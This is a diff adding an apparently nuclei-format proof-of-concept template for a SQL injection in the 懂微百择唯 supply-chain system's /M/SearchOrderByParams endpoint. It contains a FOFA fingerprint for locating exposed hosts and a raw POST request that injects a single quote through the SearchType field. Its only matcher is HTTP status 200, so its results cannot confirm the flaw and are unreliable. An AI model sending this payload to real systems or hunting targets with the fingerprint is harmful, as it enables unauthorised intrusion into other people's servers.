@@ -1,0 +1,42 @@
+id: poc-sfg5z66khgdhga0p
+info:
+  name: 懂微百择唯供应链 SearchOrderByParams SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sfg5z66khgdhga0p'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sfg5z66khgdhga0p
+    fofa: body="/Content/Css/_SiteCss/"
+http:
+- raw:
+  - 'POST /M/SearchOrderByParams HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 17
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Cookie: 你的Cookie
+
+    Connection: keep-alive
+
+
+    Key=&SearchType=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
